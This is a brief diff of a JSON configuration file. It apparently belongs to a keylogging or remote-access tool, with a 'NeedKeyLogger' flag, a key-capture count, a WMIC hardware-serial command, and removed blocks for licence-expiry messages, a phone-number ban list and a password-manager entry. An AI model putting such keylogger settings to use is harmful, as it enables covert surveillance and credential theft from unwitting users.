@@ -19,12 +19,4 @@
   "Command":"wmic baseboard get serialnumber",
   "NeedKeyLogger":true,
   "KeyLogCount":100
-  },
-  "FlashMsg":{"State":true,
-  "Title":"",
-  "Elat":"Expierd",
-  "bannums":["+989151613071"]}
-},
-"PasswordMGR":{"tChzj<m2":{"allow_divices":[],
-"State":true,
-"why":"Money"}}
+  }
